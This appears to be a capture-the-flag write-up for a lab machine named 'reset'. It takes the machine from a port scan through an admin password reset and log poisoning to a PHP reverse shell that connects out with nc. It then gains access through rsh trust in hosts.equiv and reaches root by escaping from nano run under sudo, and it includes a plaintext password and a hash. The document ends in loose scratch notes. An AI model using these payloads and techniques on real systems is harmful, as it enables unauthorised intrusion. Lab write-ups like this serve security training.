


Nmap 

```
$ nmap 10.129.234.128 -p $ports -sV -sC -Pn --disable-arp-ping PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 6a:16:1f:c8:fe:fd:e3:98:a6:85:cf:fe:7b:0e:60:aa (ECDSA) |_ 256 e4:08:cc:5f:8e:56:25:8f:38:c3:ec:df:b8:86:0c:69 (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Admin Login | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.52 (Ubuntu) 512/tcp open exec netkit-rsh rexecd 513/tcp open login? 514/tcp open shell Netkit rshd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



We see there is a Forgot Password? link at the bottom of the login form. Clicking on that allows us to change the passwords of users. Given that the title of the form is Admin Login , we try to see if we can reset the admin user's password.


# **Sensitive Data Exposure (Information Disclosure)** combined with a **Broken Access Control** vulnerability.

![](../images/Pasted%20image%2020261010142445.png)


# Foothold

Upon loggin in the Admin Dashboard we see a feature to read the contents of the syslog and the auth.log files

Upon clicking on the View Logs button, a POST request is made to dashboard.php file with file parameter set to the file path which should be read. This file parameter should be enumerated further for possible vulnerabilities such as injections and local file inclusions. It should be noted that the %2F character (URL encoded) is used for / . We already know that the server is also hosting an Apache server instance. Therefore an attempt should be made to read the log file for Apache which is stored in /var/log/apache2/access.log . Let's update the file parameter as follows:

The contents of the access.log file are returned. It should be also noted that the user agent of our requests is also saved in the access.log file, so, we can attempt to perform a log poisoning attack and poison the access.log with a crafted payload. First, we need to poison the log by sending a crafted HTTP request with our payload, in this case is a reverse shell which will connect back to us


```
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 9090
>/tmp/f'); ?>
```

This payload should be set as the User-Agent header since the access.log will log it.


As www-data the system should be enumerated further. The Rservices noted from the Nmap scan results should be investigated further from the system. The /etc/hosts.equiv file should be noted. The /etc/hosts.equiv file is used by services like rsh , rlogin , and rcp to allow "trusted" access from remote systems without requiring a password.

```
www-data@reset:/var/www/html$ cat /etc/hosts.equiv # /etc/hosts.equiv: list of hosts and users that are granted "trusted" r # command access to your system . - root - local + sadm
```


In this case the sadm user is allowed to access (from the + character in front of the name) the target machine via rsh , rlogin , or rcp without a password, from any remote host listed in /etc/hosts or ~/.rhosts . Hence, a local user called sadm can be added to our attacker machine and as that user we will be able to log in to the target machine.


Hence, a local user called sadm can be added to our attacker machine and as that user we will be able to log in to the target machine.



```
$ sudo useradd sadm 
$ sudo passwd sadm [
sudo] password for kali: 
New password: 
Retype new password:
passwd: password updated successfully 
$ su sadm 
Password: 

$ rlogin sadm@10.129.234.128 

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-136-generic x86_64) 
Last login: Fri May 30 16:58:50 UTC 2025 from 10.10.16.4 on pts/0 
sadm@reset:~$
```


# Privilege Escalation


As the sadm user, let's enumerate the currently running processes.

```
ps aux


sadm 1001 0.0 0.1 8764 3972 ? Ss 17:38 0:00 tmux new-session -d -s
```


It should be noted that there is a process from sadm which creates a new tmux detached session called sadm_session . Let's attempt to connect to this tmux session.


Upon connecting to the tmux session, it shows the output of the sudo -l command, which mentions that the sadm user as allowed to run the following commands as any user with sudo . It also shows the password of the sadm user being used with sudo -S


echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh 
sadm@reset:~$ echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh 
User sadm may run the following commands on reset: 

(ALL) PASSWD: /usr/bin/nano /etc/firewall.sh 
(ALL) PASSWD: /usr/bin/tail /var/log/syslog
(ALL) PASSWD: /usr/bin/tail /var/log/auth.log May 30 17:53:10 reset kernel: [ 11.263211] loop6: detected capacity change from 0 to 8


The sadm user is allowed to use nano to edit the /etc/firewall.sh file.

```
sudo nano /etc/firewall.sh
```


Once we are in the nano interface, we can press Ctrl+r and then Ctrl+x which allows us to execute commands from the nano interface.


Once you are in this prompt, the following command should be typed to drop in to a system shell as root .

```
reset; bash 1>&0 2>&0
```




sqlite hash?
6607cdc2db9101809081a7d0c2b197dcecccdcce


-rw------- 1 sadm sadm    7 Dec  6  2024 .rhosts



7lE2PAfVHfjz4HpE